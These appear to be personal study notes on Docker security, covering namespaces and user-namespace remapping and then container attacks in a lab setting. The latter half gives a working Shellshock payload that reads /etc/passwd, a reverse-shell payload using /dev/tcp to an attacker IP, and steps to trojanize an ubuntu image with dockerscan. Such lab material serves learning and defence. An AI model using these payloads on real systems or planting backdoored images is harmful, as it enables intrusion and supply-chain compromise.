Add a user jim in docker group:

sudo useradd jim
echo 'jim\njim'|sudo passwd jim
sudo usermod  jim -G docker

cat /etc/group |grep jim
---------------------

Docker uses namespace to provide isolation to the containers from host machine.
Docker engine uses the following namespaceson linux:

1)PID namespace for process isolation
2)NET namespace for managing network interfaces
3)IPC namespace for managing access to IPC resources
4)MNT namespace for managing filesystem mount points
5)URS namespace for isolating kerner and version identifiers
6)User Id(user) namespace for privilege isolation

---------------------------
Secenario:
1)your application running in container needs the root permission to install software
2)An attacker compromised this application and got root application inthe container
3)We mounted the /bin directory of the host on the container
4)Can some body modify files on the host's /bin directory?

Answer: Yes, by default root inside container is root inside host machine

demo:(  hm=> host machine)

hm> sudo su -
hm> echo "from host as root" >/tmp/test.txt
hm> ls -l /tmp/test.txt      //you will see this file is owned by root in hm
hm> exit                        //exit from root user

hm> echo "from host as regular user" >/tmp/test.txt	
permission error,as regular user cannot modify this file

hm>docker run -itd -v /tmp/:/shared/  alpine
hm>docker exec -it  <alpine id >   sh


#id     //verify inside container we have root permission
# echo "from container as root "  >/shared/test.txt                        //successful, so root of container can access files which belong to root of host machine    


How to prevent thsi issue?
We dont want root of containner to be root in host  machine
We can do this by enabling user namespace in docker daemon
user namespace will ensure root inside container runs on a separate context that is deooerent from host machine(root in container  != root in hm)


hm> sudo systemctl stop docker
hm>sudo dockerd --userns-remap=default  &                     #enable user namespace
Now root in container will be a non-privileged user in host machine.

hm>docker run -itd -v /tmp/:/shared/  alpine
hm>docker exec -it  <alpine id >   sh

#id     //verify inside container we have root permission
# echo "from container as root "  >/shared/test.txt                        //No permission    
==========================================================================================

Docker Attack surface:
Docker comes with significant amount of risk with it when not properly used
Because of the way docker works there is a high chance of privilege escalation from container to host,this is because docker requires root permission to operate
Any user who is part of docker group can escalate his privilege to root in host 

Docker images are generally downloaded from public repos like docker hub
these public images can have can be vulnerable like:
1)shellshock
2)dirtycow

>docker pull vulnerables/cve-2014-6271
>docker run --rm -it -p 8080:80  vulnerables/cve-2014-6271                  #this is basically a shell shock image

An simple example to cat /etc/passwd:

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://localhost:8080/cgi-bin/vulnerable

Create a reverse shell:
>netcat -lvp 4444            #here reverse shell will be opened after successful attack
>curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i  >& /dev/tcp/172.17.0.1/4444 0>&1' "\
http://localhost:8080/cgi-bin/vulnerable

where 172.17.0.1  =>attackers ip

after getting a reverse shell how to check if the target host is a container or a host machine?
>cat /proc/self/cgroup     #if the target it a docker container in this file you will see "docker" string appearing multiple times
==================================================================
backdooring existing docker image:

creating malicious image by infecting a good image:
we can do this manually but tools like dockerscan makes this easy   https://github.com/cr0hn/dockerscan

>git clone https://github.com/cr0hn/dockerscan.git
>cd dockerscan
>python3.5 -m pip install -U pip
>python3.5 -m pip install dockerscan
>dockerscan -h

Lets infect ubuntu image:

>docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-original
>export LC_ALL=C.UTF-8
>export LANG=C.UTF-8
>netcat -lvp 4444   
>dockerscan image modify trojanize ubuntu-original -l <REMOTE_MACHINE_IP> -p  4444  -o ubuntu-original-trojanized
In above step we are adding a backdoor to ubuntu image,using this we will get a reverse shell later

>docker load -i ubuntu-original-trojanized.tar
>docker run -it ubuntu:latest /bin/bash
after this your reverse shell will also get control
=================================================
Root your Docker host :
https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/